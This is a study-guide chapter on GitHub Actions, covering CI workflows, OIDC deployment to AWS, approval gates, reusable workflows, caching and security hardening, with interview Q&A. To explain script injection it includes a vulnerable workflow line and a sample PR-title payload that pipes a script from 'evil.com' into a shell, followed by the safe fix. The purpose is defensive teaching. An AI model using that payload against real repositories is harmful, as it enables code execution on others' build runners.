---
title: GitHub Actions
part: 8
chapter: 0
slug: github-actions
level: intermediate # beginner | intermediate | advanced
reading_time: 13
updated: 2026-08-03
tags: [devops, cicd, github, actions]
in_book: true
---

# GitHub Actions

GitHub Actions runs workflows in response to repository events. It is the default CI/CD choice for most teams on GitHub.

## Core Concepts

```
Event (push, pull_request, schedule)
  └── Workflow  (.github/workflows/ci.yml)
        └── Job  (runs on one runner, isolated)
              └── Step  (a shell command or an action)
```

| Concept | What It Is |
|---------|-----------|
| **Workflow** | One YAML file in `.github/workflows/` |
| **Job** | A set of steps on a fresh runner. Jobs run in parallel by default |
| **Step** | A single `run` command or a reusable `uses` action |
| **Action** | A packaged, shareable step (`actions/checkout`) |
| **Runner** | The VM executing the job (GitHub-hosted or self-hosted) |

⚠️ Each job gets a **clean machine**. Files do not carry over between jobs — you must use artifacts or caches.

## A Complete CI Workflow

```yaml
name: CI

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

# Cancel older runs on the same branch — saves runner minutes
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

# Least privilege by default
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22]

    steps:
      - uses: actions/checkout@v6

      - uses: actions/setup-node@v5
        with:
          node-version: ${{ matrix.node }}
          cache: npm            # built-in dependency caching

      - run: npm ci
      - run: npm run lint
      - run: npm run type-check
      - run: npm test -- --coverage

      - name: Upload coverage
        if: matrix.node == 22
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage/
          retention-days: 7

  build:
    needs: test               # only runs if test passed
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: docker/setup-buildx-action@v3
      - name: Build image
        uses: docker/build-push-action@v6
        with:
          push: false
          tags: api:${{ github.sha }}
          cache-from: type=gha        # GitHub Actions layer cache
          cache-to: type=gha,mode=max
```

**Key patterns above:**

| Pattern | Why |
|---------|-----|
| `concurrency` + `cancel-in-progress` | Stops wasting runners on outdated commits |
| `permissions: contents: read` | Default token is read-only; widen per job only |
| `matrix` | Test several runtime versions in parallel |
| `needs:` | Creates the dependency graph between jobs |
| `cache: npm` | Cuts install time from minutes to seconds |

## Deploying to AWS with OIDC (No Static Keys)

This is the single most important GitHub Actions security topic in interviews.

❌ **Bad — long-lived IAM user keys stored as secrets:**

```yaml
- uses: aws-actions/configure-aws-credentials@<sha>
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}      # never rotates
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

✅ **Good — OIDC federation, short-lived credentials:**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production        # gate with required reviewers
    permissions:
      id-token: write              # required to request the OIDC JWT
      contents: read

    steps:
      - uses: actions/checkout@v6

      - name: Assume AWS role via OIDC
        uses: aws-actions/configure-aws-credentials@<full-commit-sha>
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-deploy
          role-session-name: gha-${{ github.run_id }}
          aws-region: us-east-1

      - name: Push image to ECR
        run: |
          aws ecr get-login-password | docker login --username AWS --password-stdin $ECR
          docker build -t $ECR/api:${{ github.sha }} .
          docker push $ECR/api:${{ github.sha }}

      - name: Deploy to ECS
        run: |
          aws ecs update-service --cluster prod --service api --force-new-deployment
```

**How OIDC works:**

```
1. Job requests a JWT from GitHub's OIDC provider
2. JWT contains claims: repo, ref, environment, workflow
3. Job calls sts:AssumeRoleWithWebIdentity with the JWT
4. AWS validates the JWT against the trust policy
5. Job receives temporary credentials (expire in ~1 hour)
```

**The IAM trust policy is where security actually happens:**

```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123456789:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/api:environment:production"
    }
  }
}
```

⚠️ Scope the `sub` claim tightly. `repo:acme/*` lets **any** repo in the org assume your production deploy role. Pin it to a specific repository and, better still, a specific environment or branch.

## Environments and Approval Gates

An **environment** adds protection rules to a job.

```yaml
jobs:
  deploy-prod:
    environment:
      name: production
      url: https://api.acme.com
```

In repository settings you then configure:

- **Required reviewers** — the job pauses until approved
- **Wait timer** — forced delay before deploy
- **Deployment branches** — only `main` may deploy to production
- **Environment secrets** — different values per environment

✅ This is how you implement Continuous Delivery with a human gate, without writing any custom logic.

## Reusable Workflows vs Composite Actions

Both reduce duplication, but they solve different problems.

| | Reusable Workflow | Composite Action |
|-|------------------|-----------------|
| **Contains** | Whole jobs | A group of steps |
| **Called with** | `uses:` at job level | `uses:` at step level |
| **Own runner** | ✅ Yes | ❌ Runs in caller's job |
| **Can use secrets** | ✅ `secrets: inherit` | Passed as inputs |
| **Use for** | Standard build/deploy pipelines across repos | Repeated step sequences (setup, login) |

**Reusable workflow — the callee:**

```yaml
# .github/workflows/deploy.yml in acme/ci-templates
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      role-arn:
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: echo "deploying to ${{ inputs.environment }}"
```

**The caller:**

```yaml
jobs:
  deploy-staging:
    uses: acme/ci-templates/.github/workflows/deploy.yml@v1
    with:
      environment: staging
    secrets: inherit
```

✅ Centralizing deploy logic in one versioned reusable workflow is how platform teams enforce consistent, secure pipelines across dozens of repositories.

## Caching

```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      .next/cache
    key: ${{ runner.os }}-build-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-build-
```

| Concept | Meaning |
|---------|---------|
| `key` | Exact match — restores and skips saving if hit |
| `restore-keys` | Prefix fallback when the exact key misses |
| `hashFiles()` | Invalidates the cache when the lockfile changes |

⚠️ Caches are immutable once written for a key, and are scoped per branch (branches can read the default branch's cache, but not each other's).

**Cache vs artifact:**

| | Cache | Artifact |
|-|-------|----------|
| **Purpose** | Speed up builds | Pass files between jobs / keep outputs |
| **Lifetime** | Evicted after 7 days unused | Explicit retention, downloadable |
| **Use for** | `node_modules`, `~/.npm`, layers | Build output, test reports, coverage |

## Security Hardening

| Risk | Mitigation |
|------|-----------|
| Untrusted third-party action | Pin to a **full commit SHA**, not a tag |
| Overly broad token | Set `permissions:` explicitly per job |
| Script injection via PR title | Never interpolate `${{ github.event.* }}` into `run:` — pass via `env:` |
| Fork PRs stealing secrets | Use `pull_request` (no secrets) not `pull_request_target` |
| Static cloud credentials | Use OIDC |

❌ **Script injection — a real vulnerability:**

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
# A PR titled: "; curl evil.com/x.sh | sh" executes on your runner
```

✅ **Safe:**

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"     # treated as data, not code
```

## Self-Hosted Runners

Use them when you need VPC access, specific hardware, or large caches.

✅ Good reasons: reaching private RDS for integration tests, GPU builds, cost at very high volume.

⚠️ **Never attach a self-hosted runner to a public repository.** Anyone can open a pull request and run arbitrary code on your infrastructure.

## Interview Q&A

**Q: How do you authenticate GitHub Actions to AWS without storing credentials?**

Use OIDC federation. You register GitHub's OIDC provider as an identity provider in IAM, then create a role whose trust policy accepts tokens from `token.actions.githubusercontent.com` with conditions on the `sub` claim — restricting it to a specific repository and environment. In the workflow you grant `permissions: id-token: write`, then `aws-actions/configure-aws-credentials` exchanges the GitHub-issued JWT for temporary STS credentials that expire in about an hour. There are no long-lived access keys to rotate or leak, and the trust policy gives you fine-grained control over which repo and branch can deploy where.

**Q: What is the difference between a reusable workflow and a composite action?**

A reusable workflow is called at the job level and defines complete jobs, so it runs on its own runner, can define multiple jobs, and can receive secrets directly with `secrets: inherit`. A composite action is called at the step level and bundles a sequence of steps that run inside the caller's job on the caller's runner. Use composite actions for repeated step groups like "set up Node and log into ECR", and reusable workflows for standardizing an entire build-and-deploy pipeline across many repositories.

**Q: How do you keep GitHub Actions workflows secure?**

Pin third-party actions to a full commit SHA so a compromised tag cannot inject code. Declare `permissions` explicitly and start from `contents: read`, widening only per job. Never interpolate untrusted event data such as a PR title or branch name directly into a `run` block — pass it through `env` so it is treated as data rather than shell code. Use `pull_request` rather than `pull_request_target` for fork contributions, since the latter runs with access to secrets. Replace static cloud keys with OIDC, and use environment protection rules so production deploys require review.

**Q: What is the difference between caching and artifacts?**

Caching is a build-speed optimization: you store dependency directories or build caches keyed by a lockfile hash, and the cache is best-effort — a miss just means a slower build. Artifacts are outputs you explicitly want to keep or hand to another job: build bundles, test reports, coverage. Artifacts have a defined retention period and are downloadable from the run page. Because every job gets a fresh runner, you use artifacts to move files between jobs, and caches to avoid re-downloading the same dependencies.

**Q: A workflow is taking 25 minutes. How do you speed it up?**

First look at the job graph — steps that are sequential but independent should be separate parallel jobs, since jobs run concurrently by default. Add dependency caching with `cache: npm` in `setup-node` or `actions/cache` keyed on the lockfile, and enable Docker layer caching with `cache-from: type=gha`. Shard slow test suites across a matrix so each runner handles a subset. Add a `concurrency` group with `cancel-in-progress` so superseded commits stop consuming runners. Finally, move genuinely expensive suites such as full end-to-end tests off the pull request path and onto merges to `main` or a nightly schedule.

---

[← AWS CodePipeline](./02-aws-codepipeline.md) | [GitLab CI →](./04-gitlab-ci.md)
